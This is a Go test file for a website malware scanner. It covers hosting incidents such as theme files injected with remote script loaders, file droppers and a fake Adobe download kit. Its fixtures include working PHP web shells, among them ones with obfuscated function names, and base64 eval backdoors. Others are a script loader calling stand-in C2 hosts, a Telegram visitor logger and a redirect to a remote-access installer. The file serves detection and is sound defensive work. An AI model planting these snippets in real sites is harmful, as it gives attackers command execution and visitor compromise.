		"copy inside a page": "<html><body><?php if (isset($_POST['submit'])) { $to = \"admin@example.com\"; $from = $_POST['email']; $subject2 = \"Copy of your form submission\";\n" +
			"mail($to, \"Form submission\", $_POST['message'], \"From:\" . $from); mail($from, $subject2, $_POST['message'], \"From:\" . $to); } ?></body></html>\n",
	}
	for name, body := range contact {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	for name, body := range map[string]string{
		"relay":                  "<?php\n$to = $_POST['to'];\nmail($to, $_POST['subject'], $_POST['body'], 'From: a@b.c');\necho 'sent';\n",
		"relay with own address": "<?php\n$me = \"log@example.com\";\nmail($_POST['to'], $_POST['subject'], $_POST['body']);\nmail($me, 'sent', $_POST['to']);\n",
		"silent relay":           "<?php\nerror_reporting(0);\n$me = \"log@example.com\";\nmail($_POST['to'], 'Hello', $_POST['body']);\nmail($me, 'sent', $_POST['to']);\n",
	} {
		if d := analyze(".php", []byte(body)); d == nil || d.Signature != "PHP.Spam.Mailer" {
			t.Errorf("%s: %+v", name, d)
		}
	}

	// Updater copies, only beside the file they copy.
	dir := filepath.Join(t.TempDir(), "home", "u")
	exists := map[string]bool{}
	for _, rel := range []string{
		"public_html/wp-content/plugins/woocommerce/includes/rest-api/Server.php",
		"public_html/wp-content/plugins/woocommerce/includes/rest-api/.temp.1746060994093943920.Server.php",
		"public_html/wp-content/plugins/elementor/core/editor/.temp.1746138958971757052.editor.php",
	} {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte("<?php /* inert test fixture */"), 0o644)
		exists["/home/u/"+rel] = true
	}
	mode := func(p string) int {
		if exists[p] {
			return 0o644
		}
		return -1
	}
	if d := plantedByName("/home/u/public_html/wp-content/plugins/woocommerce/includes/rest-api/.temp.1746060994093943920.Server.php", mode); d != nil {
		t.Errorf("updater copy: %+v", d)
	}
	if d := plantedByName("/home/u/public_html/wp-content/plugins/elementor/core/editor/.temp.1746138958971757052.editor.php", mode); d == nil {
		t.Errorf("a .temp. copy with nothing beside it: not reported")
	}

	// Codestar Framework option helpers (codestar-framework, carriar-core,
	// plumco-core, cascara-core, ukrdevs-restaurant-core), and a static page
	// that includes its header and has CSS images further down.
	codestar := "<?php\nif ( ! function_exists( 'cs_encode_string' ) ) {\n  function cs_encode_string( $string ) {\n    return rtrim( strtr( call_user_func( 'base' . '64' . '_encode', addslashes( gzcompress( serialize( $string ), 9 ) ) ), '+/', '-_' ), '=' );\n  }\n}\n" +
		"if ( ! function_exists( 'cs_decode_string' ) ) {\n  function cs_decode_string( $string ) {\n    return unserialize( gzuncompress( stripcslashes( call_user_func( 'base' . '64' . '_decode', rtrim( strtr( $string, '-_', '+/' ), '=' ) ) ) ) );\n  }\n}\n" +
		"function cs_get_option( $option_name = '', $default = '' ) { $options = apply_filters( 'cs_get_option', get_option( CS_OPTION ), $option_name, $default ); return $options; }\n"
	page := "<?php include('includes/header.php') ?>\n<div class=\"hero\" style=\"background:url('img/bg.png');\">Terms</div>\n<?php include('includes/footer.php') ?>\n"
	for name, body := range map[string]string{"Codestar helpers": codestar, "page with includes": page} {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	for name, body := range map[string]string{
		"split decoder into eval": "<?php\nfunction cs_decode_string( $string ) {\n  return unserialize( call_user_func( 'base' . '64' . '_decode', $string ) );\n}\neval(call_user_func('base' . '64' . '_decode', $_POST['x']));\n",
		"include of an image":     "<?php include('wp-content/uploads/2026/10/x.png'); ?>\n",
	} {
		if d := analyze(".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s: %+v", name, d)
		}
	}

	// A theme's own command-line tools (metasynctech tools/sync-figma-*.php)
	// log in as the first administrator, but stop unless run from a shell.
	cli := "<?php\n/** Run: php tools/sync-figma-footer.php */\nif ( PHP_SAPI !== 'cli' ) { exit( 1 ); }\nrequire dirname( __DIR__, 4 ) . '/wp-load.php';\n" +
		"$admins = get_users( array( 'role' => 'administrator', 'number' => 1 ) );\nwp_set_current_user( $admins[0]->ID );\nupdate_field( 'footer_logo', 12, 'option' );\necho \"done\\n\";\n"
	if d := analyze(".php", []byte(cli)); d != nil {
		t.Errorf("command-line tool: %+v", d)
	}
	web := strings.Replace(cli, "if ( PHP_SAPI !== 'cli' ) { exit( 1 ); }\n", "if ( $_GET['k'] !== 'x' ) { exit( 1 ); }\n", 1)
	if d := analyze(".php", []byte(web)); d == nil || d.Signature != "PHP.Backdoor.WPAdminLogin" {
		t.Errorf("web login: %+v", d)
	}
	// An empty hidden file left by a kit ("<?php\n") runs nothing.
	if !inertPHP([]byte("<?php\n")) || inertPHP([]byte("<?php\neval($_POST[1]);")) {
		t.Errorf("empty PHP file")
	}

	// PayPal Payments: a long settings line, a closure and an instanceof
	// assert. An assert of code built on one long line stays caught.
	long := strings.Repeat("'k' => array('title' => __('Google Pay Button', 'x'), 'type' => 'checkbox'), ", 40)
	paypal := "<?php\nnamespace WooCommerce\\PayPalCommerce\\Googlepay;\nreturn array('wcgateway.settings.fields' => function (array $fields, $container): array {\n" +
		"$insert_after = function (array $a, string $k, array $n): array { return array_merge($a, $n); };\n$dm = $container->get('wcgateway.display-manager');\nassert($dm instanceof DisplayManager);\n" +
		"return $insert_after($fields, 'h', array(" + long + "));\n});\n"
	if d := analyze(".php", []byte(paypal)); d != nil {
		t.Errorf("PayPal settings: %+v", d)
	}
	packed := "<?php $f='str'.'rev'; $x=$f('abc'); assert($x instanceof Foo); eval(base64_decode('" + strings.Repeat("ZWNobyAxOw==", 300) + "'));"
	if d := analyze(".php", []byte(packed)); d == nil || d.Category != CatVirus {
		t.Errorf("packed eval next to a type assert: %+v", d)
	}

	// Fixed commands and escaped arguments; raw request data stays caught.
	for name, body := range map[string]string{
		"log viewer local IP": "<?php\nnamespace Opcodes\\LogViewer\\Utils;\nclass Utils { public static function localIp() { if (isset($_SERVER['SERVER_ADDR'])) { return $_SERVER['SERVER_ADDR']; }\n$ip = shell_exec(\"hostname -I | awk '{print $1}'\");\nreturn trim($ip); } }\n",
		"ffmpeg on an upload": "<?php\nsession_start();\n$in = $_FILES['video']['tmp_name'];\n$out = 'skills/' . uniqid() . '.mp4';\nexec('ffmpeg -i ' . escapeshellarg($_FILES['video']['tmp_name']) . ' -vcodec libx264 ' . escapeshellarg($out), $o, $rc);\n",
	} {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	for name, body := range map[string]string{
		"command from the request": "<?php\nif (isset($_GET['c'])) { system($_GET['c']); }\n",
		"argument not escaped":     "<?php\nexec('ping -c 1 ' . $_POST['host'] . ' ' . escapeshellarg('x'), $o);\n",
	} {
		if d := analyze(".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s: %+v", name, d)
		}
	}

	// Test vectors in a package's tests folder; the same blob in a theme's
	// own file is still reported, and a shell in a tests folder still caught.
	s := newScanner(t)
	var noise []byte
	for h := sha256.Sum256([]byte("vector")); len(noise) < 768; h = sha256.Sum256(h[:]) {
		noise = append(noise, h[:]...)
	}
	vec := "<?php\nnamespace kornrunner;\nfinal class KeccakTest extends TestCase { public function testVectors() { $raw = base64_decode('" + base64.StdEncoding.EncodeToString(noise) + "');\n$this->assertSame(64, strlen(Keccak::hash($raw, 256))); } }\n"
	if d := s.checkContent("/home/u/public_html/vendor/kornrunner/keccak/test/KeccakTest.php", ".php", []byte(vec)); d != nil {
		t.Errorf("package test vectors: %+v", d)
	}
	if d := s.checkContent("/home/u/public_html/wp-content/themes/x/functions.php", ".php", []byte(vec)); d == nil {
		t.Errorf("the same outside tests: not reported")
	}
	if d := s.checkContent("/home/u/public_html/vendor/a/b/tests/x.php", ".php", []byte("<?php\nif (isset($_GET['c'])) { system($_GET['c']); }\n")); d == nil {
		t.Errorf("shell in a tests folder: not caught")
	}

	// HTTrack's stub for a page it did not copy, saved as the image; a
	// redirect page with a script under an image name stays reported.
	stub := "<HTML>\n<!-- Created by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->\n<HEAD><META HTTP-EQUIV=\"Content-Type\" CONTENT=\"text/html;charset=UTF-8\"><META HTTP-EQUIV=\"Refresh\" CONTENT=\"0; URL=https://shop.example.com/uploads/categories/x.jpg\"><TITLE>Page has moved</TITLE></HEAD>\n<BODY><A HREF=\"https://shop.example.com/uploads/categories/x.jpg\"><h3>Click here...</h3></A></BODY>\n</HTML>\n"
	if d := markupInImage(".jpg", []byte(stub)); d != nil {
		t.Errorf("HTTrack stub: %+v", d)
	}
	spam := strings.Replace(stub, "<TITLE>", "<script>top.location='https://spam.example'</script><TITLE>", 1)
	if d := markupInImage(".jpg", []byte(spam)); d == nil {
		t.Errorf("redirect with a script: not reported")
	}

	// Fixes from the samples of the 10 servers still scanning.
	codevz := "<?php if ( ! defined( 'ABSPATH' ) ) { die; }\nif ( ! function_exists( 'codevz_add_field' ) ) { function codevz_add_field( $field = array() ) { $class = 'Codevz_Field_' . $field['type']; if ( class_exists( $class ) ) { $element = new $class( $field ); $element->output(); } } }\n" +
		"if ( ! function_exists( 'codevz_encode_string' ) ) {\n  function codevz_encode_string( $string ) {\n    return rtrim( strtr( call_user_func( 'base'. '64' .'_encode', addslashes( gzcompress( serialize( $string ), 9 ) ) ), '+/', '-_' ), '=' );\n  }\n}\n" +
		"if ( ! function_exists( 'codevz_decode_string' ) ) {\n  function codevz_decode_string( $string ) {\n    return unserialize( gzuncompress( stripslashes( call_user_func( 'base'. '64' .'_decode', rtrim( strtr( $string, '-_', '+/' ), '=' ) ) ) ) );\n  }\n}\n" +
		"function codevz_get_var( $var, $default = '' ) { if ( isset( $_POST[$var] ) ) { return $_POST[$var]; } return $default; }\n"
	yii := "<?php\nreturn array(\n'Make sure $_SERVER[\"PATH_INFO\"] (or $_SERVER[\"PHP_SELF\"] and $_SERVER[\"SCRIPT_NAME\"]) contains proper value.' => '',\n);\n"
	mailer := "<?php\n$msg = '';\nif (array_key_exists('userfile', $_FILES)) {\n    $uploadfile = tempnam(sys_get_temp_dir(), sha1($_FILES['userfile']['name']));\n    if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {\n        $mail = new PHPMailer();\n        $mail->addAttachment($uploadfile, 'My uploaded file');\n    }\n}\n?>\n<form method=\"post\" enctype=\"multipart/form-data\"><input name=\"userfile\" type=\"file\"></form>\n"
	for name, body := range map[string]string{"Codevz helpers": codevz, "Yii requirements text": yii} {
		if d := analyze(".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
	if d := pluginInjectors([]byte(mailer), has(mailer)); d != nil {
		t.Errorf("PHPMailer example: %+v", d)
	}
	if d := analyze(".php", []byte("<?php\n$_GET['f']($_GET['a']);\n")); d == nil {
		t.Errorf("function named by the request: not caught")
	}
	if got := extOf("example_com.php.error.log"); got != ".log" {
		t.Errorf("PHP error log read as %s", got)
	}
	if got := extOf("shell.php.bak"); got != ".php" {
		t.Errorf("renamed script read as %s", got)
	}
	sc := s.checkContent("/home/u/public_html/vendor/squizlabs/php_codesniffer/src/Standards/Generic/Tests/PHP/LowerCaseKeywordUnitTest.inc", ".php",
		[]byte("<?php\n$x = Array(1);\nEVAL('foo');\n__HALT_COMPILER(); // keywords\nfunction\n"))
	if sc != nil {
		t.Errorf("code sniffer sample: %+v", sc)
	}
	if d := plantedByName("/home/u/public_html/vendor/a/b/tests/.atoum.php", func(string) int { return 0o644 }); d != nil {
		t.Errorf("atoum settings in tests: %+v", d)
	}
	if d := plantedByName("/home/u/public_html/vendor/a/b/tests/.sys_9f3a1c7e2b.php", func(string) int { return 0o644 }); d == nil {
		t.Errorf("random hidden name in tests: not reported")
	}

	// Logs kept behind an exit: they quote attackers' requests as text.
	for name, body := range map[string]string{
		"Sucuri audit queue": "<?php exit(0); ?>\n{\"1793500000\":\"blocked request cmd=uname IndoXploit\"}\n",
		"CodeIgniter log":    "<?php defined('BASEPATH') OR exit('No direct script access allowed'); ?>\n\nERROR - 2026-10-30 --> 404 Page Not Found: wso.php?act=IndoXploit\n",
	} {
		if !inertPHP([]byte(body)) {
			t.Errorf("%s: not inert", name)
		}
	}
	if inertPHP([]byte("<?php defined('BASEPATH') OR exit('No direct script access allowed'); ?>\n<?php system($_GET['c']);")) {
		t.Errorf("guard then code: inert")
	}
	if inertPHP([]byte("<?php defined('BASEPATH') OR exit('No direct script access allowed');\nclass Welcome extends CI_Controller {}")) {
		t.Errorf("a controller behind the guard: inert")
	}

	// CURCY's settings as base64 JSON; base64 code next to eval stays.
	var cfg strings.Builder
	cfg.WriteString("{")
	for i := 0; i < 40; i++ {
		fmt.Fprintf(&cfg, "\"currency_%d\":{\"rate\":\"1.%d\",\"pos\":\"left\",\"decimals\":\"2\"},", i, i)
	}
	cfg.WriteString("\"end\":1}")
	curcy := "<?php\nclass WOOMULTI_CURRENCY_F { public function activate() { $data_init = '" + base64.StdEncoding.EncodeToString([]byte(cfg.String())) + "';\nupdate_option('woo_multi_currency_params', json_decode(base64_decode($data_init), true)); } }\n"
	if d := analyze(".php", []byte(curcy)); d != nil {
		t.Errorf("CURCY defaults: %+v", d)
	}

	// Another product's own storage is never scanned or acted on.
	if !systemPath("/var/imunify360/cleanup_storage/1700000000_x.php") || systemPath("/var/www/html/x.php") {
		t.Errorf("Imunify360 storage")
	}
}

// server1.superfast (2026-11-02): a fake Cloudflare check on expresswrap.ae
// and five other sites. One line appended to the active theme's
// functions.php (Astra, Ohio, child themes) prints a script that loads a
// randomly named script from the attacker's domain; the page is built in
// the browser, so the server never holds its text. Inert shapes (the
// domains are example names); a site's own chat and analytics snippets and
// enqueued scripts stay clean.
func TestFleetFooterScriptLoader(t *testing.T) {
	s := newScanner(t)
	theme := "<?php\n/** Astra functions and definitions */\nif ( ! defined( 'ABSPATH' ) ) { exit; }\ndefine( 'ASTRA_THEME_VERSION', '4.13.3' );\nrequire_once ASTRA_THEME_DIR . 'inc/core/class-astra-theme-options.php';\n"
	for name, line := range map[string]string{
		"loader":         `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://example-c2.test/kbS0.js";s.async=true;document.head.appendChild(s);</script>'; }, 99);`,
		"second domain":  `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://another-c2.test/cA.js";s.async=true;document.head.appendChild(s);</script>'; }, 99);`,
		"in the head":    `add_action( "wp_head", function() { echo "<script>let x = document.createElement('script'); x.src='https://c2.example.test/Qz7.js'; document.body.appendChild(x);</script>"; } );`,
		"escaped quotes": `add_action('wp_footer', function () { echo '<script>var s=document.createElement(\"script\");s.src=\"https://example-c2.test/aB1.js\";document.head.appendChild(s);</script>'; }, 99);`,
	} {
		body := theme + "\n" + line + "\n"
		d := s.checkContent("/home2/u/public_html/wp-content/themes/astra/functions.php", ".php", []byte(body))
		if d == nil || d.Signature != "PHP.Injector.FooterScriptLoader" || d.Category != CatVirus {
			t.Errorf("%s: %+v", name, d)
		}
	}
	for name, line := range map[string]string{
		"Crisp chat":   `add_action('wp_footer', function () { echo '<script>window.$crisp=[];window.CRISP_WEBSITE_ID="1";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>'; });`,
		"named widget": `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://cdn.example.test/widget.js";document.head.appendChild(s);</script>'; });`,
		"Tag Manager":  `add_action('wp_head', function () { echo "<script>(function(w,d,s,l,i){w[l]=w[l]||[];var f=d.getElementsByTagName(s)[0],j=d.createElement(s);j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-X');</script>"; });`,
		"enqueued":     `add_action('wp_enqueue_scripts', function () { wp_enqueue_script('chat', 'https://cdn.example.test/aB1.js', array(), null, true); });`,
	} {
		body := theme + "\n" + line + "\n"
		if d := s.checkContent("/home2/u/public_html/wp-content/themes/astra/functions.php", ".php", []byte(body)); d != nil {
			t.Errorf("%s: %+v", name, d)
		}
	}
}

// The loader is cut from the theme's functions.php, not the whole file
// taken away: the site keeps its theme, the original stays in quarantine.
func TestFleetFooterScriptLoaderTrimmed(t *testing.T) {
	s := newScanner(t)
	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
		t.Fatal(err)
	}
	dir := filepath.Join(t.TempDir(), "public_html", "wp-content", "themes", "astra")
	os.MkdirAll(dir, 0o755)
	p := filepath.Join(dir, "functions.php")
	clean := "<?php\n/** Astra functions (inert fixture) */\nif ( ! defined( 'ABSPATH' ) ) { exit; }\ndefine( 'ASTRA_THEME_VERSION', '4.13.3' );\nfunction astra_fixture() { return 1; }\n"
	loader := `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://example-c2.test/kbS0.js";s.async=true;document.head.appendChild(s);</script>'; }, 99);`
	os.WriteFile(p, []byte(clean+"\n"+loader+"\n\n"+strings.Replace(loader, "kbS0", "cA", 1)+"\n"), 0o644)
	info, _ := os.Lstat(p)
	d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
	if err != nil || d == nil || d.Signature != "PHP.Injector.FooterScriptLoader" {
		t.Fatalf("not detected: %+v %v", d, err)
	}
	f, err := s.Record(0, "realtime", p, info, *d)
	if err != nil || f.Status != "trimmed" {
		t.Fatalf("%+v %v", f, err)
	}
	got, err := os.ReadFile(p)
	if err != nil {
		t.Fatal("theme file taken away")
	}
	if strings.Contains(string(got), "createElement") || !strings.Contains(string(got), "function astra_fixture()") {
		t.Fatalf("not trimmed: %q", got)
	}
}

// business600 joomlash (2026-10-27 to 11-02): Akeeba Kickstart's restore.php
// (Akeeba Backup Pro's installer package, 330 KB) and Akeeba Solo's
// kickstart.txt were quarantined as PHP.Backdoor.FileDropper. The only
// request read, getQueryParam(), sits right above debugMsg(), which writes
// a fixed debug.txt: two functions, no request data reaching the write.
// A dropper that writes what the request sent is still caught, in a
// function of its own or at the top level.
func TestFleetAkeebaRestoreDebugLog(t *testing.T) {
	s := newScanner(t)
	vendor := "<?php\n/**\n * Akeeba Restore\n */\ndefine('_AKEEBA_RESTORATION', 1);\n" +
		"function getQueryParam($key, $default = null)\n{\n\t$value = $default;\n\n\tif (array_key_exists($key, $_REQUEST))\n\t{\n\t\t$value = $_REQUEST[$key];\n\t}\n\n\treturn $value;\n}\n\n" +
		"// Debugging function\nfunction debugMsg($msg)\n{\n\tif (!defined('KSDEBUG'))\n\t{\n\t\treturn;\n\t}\n\n\t$fp = fopen('debug.txt', 'a');\n\n\tfwrite($fp, $msg . PHP_EOL);\n\tfclose($fp);\n}\n\n" +
		"class AKEncryptionAES\n{\n\tpublic static function AESDecryptCtr($ciphertext, $password, $nBits)\n\t{\n\t\t$ciphertext = base64_decode($ciphertext);\n\t\t$out = '';\n\t\tfor ($i = 0; $i < strlen($ciphertext); $i++) { $out .= chr(ord($ciphertext[$i]) ^ 7); }\n\t\treturn $out;\n\t}\n}\n" +
		"class AKPostprocDirect\n{\n\tpublic function process($file, $data)\n\t{\n\t\t$fp = @fopen($file, 'wb');\n\t\tfwrite($fp, $data);\n\t\tfclose($fp);\n\t\treturn copy($file, $file . '.bak');\n\t}\n}\n" +
		"$json = getQueryParam('json', null);\n$raw = json_decode(AKEncryptionAES::AESDecryptCtr($json, 'secret', 128), true);\n"
	for _, p := range []string{"/home/u/public_html/tmp/install_6ae1/backend/restore.php", "/home/u/site/Solo/assets/installers/kickstart.txt"} {
		ext := ".php"
		if strings.HasSuffix(p, ".txt") {
			ext = ".txt"
		}
		if d := s.checkContent(p, ext, []byte(vendor)); d != nil {
			t.Errorf("%s: %s", p, d.Signature)
		}
	}
	bad := map[string]string{
		"top level":       "<?php $d = base64_decode($_POST['d']); $f = $_POST['f']; $h = fopen($f, 'w'); fwrite($h, $d . chr(10)); fclose($h);",
		"in one function": "<?php function save() {\n\t$d = base64_decode($_POST['d']);\n\t$h = fopen($_POST['f'], 'w');\n\tfwrite($h, $d);\n\tfclose($h);\n}\nsave();",
		"put contents":    "<?php function w($n) { return chr($n); }\nfile_put_contents($_GET['n'], base64_decode($_GET['c']));",
	}
	for name, body := range bad {
		if d := s.checkContent("/home/u/public_html/x.php", ".php", []byte(body)); d == nil || d.Category != CatVirus {
			t.Errorf("%s not caught: %+v", name, d)
		}
	}
}

// business600 joomlash (2026-11-03): the extension packages quarantined as
// Archive.PHP.Backdoor.FileDropper (Akeeba Backup Pro) and
// Archive.PHP.Obfuscated.SplitFunctionName (JExtStore) were skipped by
// findings.recheck, which only judged scripts, so a fixed rule never gave
// them back. A quarantined zip is now judged by its members; a zip that
// still holds a web shell stays.
func TestFleetRecheckQuarantinedZip(t *testing.T) {
	s := newScanner(t)
	dir := t.TempDir()
	mk := func(name, member, body string) string {
		q := filepath.Join(dir, name)
		f, _ := os.Create(q)
		zw := zip.NewWriter(f)
		w, _ := zw.Create(member)
		w.Write([]byte(body))
		zw.Close()
		f.Close()
		return q
	}
	akeeba := "<?php\nfunction getQueryParam($key, $default = null)\n{\n\t$value = $default;\n\tif (array_key_exists($key, $_REQUEST))\n\t{\n\t\t$value = $_REQUEST[$key];\n\t}\n\treturn $value;\n}\n\n" +
		"function debugMsg($msg)\n{\n\t$fp = fopen('debug.txt', 'a');\n\tfwrite($fp, $msg . PHP_EOL);\n\tfclose($fp);\n}\n" +
		"function dec($c) { $c = base64_decode($c); $o = ''; for ($i = 0; $i < strlen($c); $i++) { $o .= chr(ord($c[$i]) ^ 7); } return $o; }\n"
	shell := "<?php $d = base64_decode($_POST['d']); $h = fopen($_POST['f'], 'w'); fwrite($h, $d . chr(10)); fclose($h);"
	rows := []struct{ path, q string }{
		{"/home/u/tmp/com_akeebabackup-pro.zip", mk("a.zip", "backend/restore.php", akeeba)},
		{"/home/u/jdownloads/evil-pack.zip", mk("b.zip", "admin/up.php", shell)},
	}
	for i, r := range rows {
		if _, err := s.DB.Exec(`INSERT INTO findings (id, source, path, owner, category, signature, status, qpath, created_at, updated_at) VALUES (?, 'realtime', ?, 'u', 'virus', 'Archive.PHP.Backdoor.FileDropper', 'quarantined', ?, 1, 1)`, i+1, r.path, r.q); err != nil {
			t.Fatal(err)
		}
	}
	rep, err := s.Recheck(RecheckFilter{}, nil)
	if err != nil || rep.Checked != 2 || rep.Still != 1 || len(rep.Clean) != 1 || rep.Clean[0].ID != 1 {
		t.Fatalf("%+v %v", rep, err)
	}
}

// server100 (2026-11-04, aloradecor.com, reported to Hetzner as a RAT): a
// fake Adobe download kit uploaded into a WordPress site - a checkbox
// "captcha", a visitor logger to Telegram, a page that sends the visitor to
// another site's download.php, and that file's redirect to a ScreenConnect
// access client. None had a finding. Inert shapes (example domains, a fake
// bot token); look-alikes from real sites stay clean.
func TestFleetFakeAdobeDownloadKit(t *testing.T) {
	s := newScanner(t)
	kit := map[string]struct{ name, sig, body string }{
		"redirect": {"download.php", "Malware.Redirect.RemoteAccessInstaller",
			"<?php\nheader(\"Location: https://relay.example.test/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest\", true, 301);\nexit;\n?>\n"},
		"lure": {"index.php", "Phishing.FakeUpdate.DownloadLure",
			"<?php session_start(); if (empty($_SESSION['captcha_verified'])) { header('Location: captcha.php'); exit(); } ?>\n<html><head><title>Adobe Acrobat Viewer Download</title>\n<meta http-equiv=\"refresh\" content=\"10; url=https://other.example.test/downloadnew.php\"></head>\n" +
				"<body><p class=\"subtitle\">This document requires the latest version of Adobe Acrobat Viewer</p><p>The latest version will download automatically.</p></body></html>\n"},
		"visit logger": {"visit.php", "Phishing.Collector.TelegramVisitLogger",
			"<?php\nsession_start();\n$botToken = \"0000000000:inert-test-token\"; $chatId = \"1\";\n$ip = $_SERVER['REMOTE_ADDR'];\n$hostname = gethostbyaddr($ip);\n$info = @file_get_contents(\"http://ip-api.com/json/$ip\");\n" +
				"$msg = \"New Visitor: $ip $hostname\";\nfile_get_contents(\"https://api.telegram.org/bot$botToken/sendMessage\", false, stream_context_create(['http' => ['method' => 'POST', 'content' => http_build_query(['chat_id' => $chatId, 'text' => $msg])]]));\nheader(\"Location: index.php\");\nexit();\n"},
		"checkbox captcha": {"captcha.php", "Phishing.FakeCaptcha.CheckboxGate",
			"<?php\nsession_start();\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    if (isset($_POST['captcha_checkbox']) && $_POST['captcha_checkbox'] === 'on') {\n        $_SESSION['captcha_verified'] = true;\n        header(\"Location: visit.php\");\n        exit();\n    }\n}\n?>\n" +
				"<h2>Verify You're Human</h2><form method=\"post\"><label><input type=\"checkbox\" name=\"captcha_checkbox\"> I'm not a robot</label><button type=\"submit\">Verify</button></form>\n"},
	}
	for what, k := range kit {
		p := "/home/u/public_html/a/adobelanding/" + k.name
		if d := s.checkContent(p, extOf(p), []byte(k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
			t.Errorf("%s: %+v", what, d)
		}
	}
	for what, body := range map[string]string{
		// An IT company's page linking its support client.
		"support link": "<html><body><h1>Remote support</h1><p>Download our support client:</p><a href=\"https://help.example.test/Bin/ScreenConnect.ClientSetup.exe?e=Support&y=Guest\">Start session</a></body></html>\n",
		// A shop's order form sent to the owner's Telegram.
		"order to Telegram": "<?php\n$name = $_POST['name']; $phone = $_POST['phone'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$geo = @file_get_contents(\"http://ip-api.com/json/$ip\");\nfile_get_contents(\"https://api.telegram.org/bot0000:inert/sendMessage?chat_id=1&text=\" . urlencode(\"$name $phone $ip\"));\nheader('Location: thanks.html');\n",
		// A real check, and a plain download page.
		"reCAPTCHA form": "<?php\nif (isset($_POST['g-recaptcha-response'])) { $r = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=x&response=' . $_POST['g-recaptcha-response']); if (json_decode($r)->success) { $_SESSION['human_verified'] = true; } }\n?><form method=\"post\"><div class=\"g-recaptcha\"></div><button>Send</button></form>\n",
		"Adobe link":     "<html><body><p>To read these PDF files you need the latest version of Adobe Acrobat Reader, free from <a href=\"https://get.adobe.com/reader/\">Adobe</a>.</p></body></html>\n",
	} {
		p := "/home/u/public_html/page.php"
		if strings.Contains(what, "link") {
			p = "/home/u/public_html/page.html"
		}
		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
			t.Errorf("%s: %+v", what, d)
		}
	}
}

// Server audit (s1, 2026-11-05): a web shell that spells the runner's name
// in escapes or pieces and calls it with the request was not caught (the
// plain one-liners were). Inert fixtures; look-alikes stay clean.
func TestFleetHiddenFunctionNameShell(t *testing.T) {
	s := newScanner(t)
	for what, body := range map[string]string{
		"hex name":    `<?php $f="\x73\x79\x73\x74\x65\x6d"; $f($_GET['c']); ?>`,
		"octal name":  `<?php $r = "\160\141\163\163\164\150\162\165"; $r($_REQUEST["x"]); ?>`,
		"pieces":      `<?php $a='sys'.'tem'; $a($_GET['c']); ?>`,
		"mixed":       "<?php\n$k = 'shell' . \"_\\x65xec\";\necho $k($_POST['q']);\n",
		"cookie code": `<?php $z = "as"."sert"; @$z($_COOKIE['p']); ?>`,
	} {
		p := "/home/u/public_html/wp-content/uploads/x.php"
		if d := s.checkContent(p, extOf(p), []byte(body)); d == nil || d.Signature != "PHP.Backdoor.HiddenFunctionName" {
			t.Errorf("%s: %+v", what, d)
		}
	}
	for what, body := range map[string]string{
		// A name kept plainly, run on a fixed command.
		"plain name": "<?php\n$fn = 'exec';\n$fn('uptime', $out);\nprint_r($out);\n",
		// Pieces that make a harmless function, with request data.
		"escaper":     "<?php\n$e = 'esc_' . 'html';\necho $e($_GET['s']);\n",
		"str replace": "<?php\n$f = \"str_\" . \"replace\";\necho $f('a', 'b', $_POST['t']);\n",
		// A runner name in pieces, never called with the request.
		"log message":  "<?php\n$msg = 'sys' . 'tem';\nerror_log('module: ' . $msg);\n",
		"newline text": "<?php\n$sep = \"\\n\";\necho $_GET['a'] . $sep;\n",
	} {
		p := "/home/u/public_html/wp-content/plugins/p/x.php"
		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
			t.Errorf("%s: %+v", what, d)
		}
	}
}

// business500 (liberato, 2026-11-05): BoldGrid Backup's
// wp-content/.boldgrid-backup-locator.php (a direct-request guard, then
// the backup folder's path) was quarantined as a hidden PHP file and
// rewritten by the plugin 5,073 times. Code that guards and returns a
// fixed text runs nothing; the same shape with request data or a call
// stays a finding.
func TestFleetBoldGridLocator(t *testing.T) {
	s := newScanner(t)
	p := "/home2/u/public_html/wp-content/.boldgrid-backup-locator.php"
	locator := "<?php\n// phpcs:disable\n$__bg_script = isset( $_SERVER['SCRIPT_FILENAME'] ) ? (string) $_SERVER['SCRIPT_FILENAME'] : '';\n$__bg_direct = ( '' !== $__bg_script && @realpath( $__bg_script ) === @realpath( __FILE__ ) );\nif ( $__bg_direct || count( get_included_files() ) <= 1 ) {\n\theader( 'HTTP/1.1 403 Forbidden' );\n\texit;\n}\nreturn '/home2/u/boldgrid_backup';\n"
	if d := s.checkContent(p, extOf(p), []byte(locator)); d != nil {
		t.Errorf("locator: %+v", d)
	}
	for what, body := range map[string]string{
		"request data": "<?php\nif ( count( get_included_files() ) <= 1 ) { header( 'HTTP/1.1 403' ); exit; }\n$x = $_GET['p'];\nreturn '/tmp/x';\n",
		"other call":   "<?php\nif ( count( get_included_files() ) <= 1 ) { file_put_contents( '/tmp/a', 'b' ); exit; }\nreturn '/tmp/x';\n",
		"include":      "<?php\ninclude '/tmp/x.jpg';\nreturn 'x';\n",
		"var call":     "<?php\n$f = 'phpinfo';\nif ( isset( $f ) ) { $f(); }\nreturn 'x';\n",
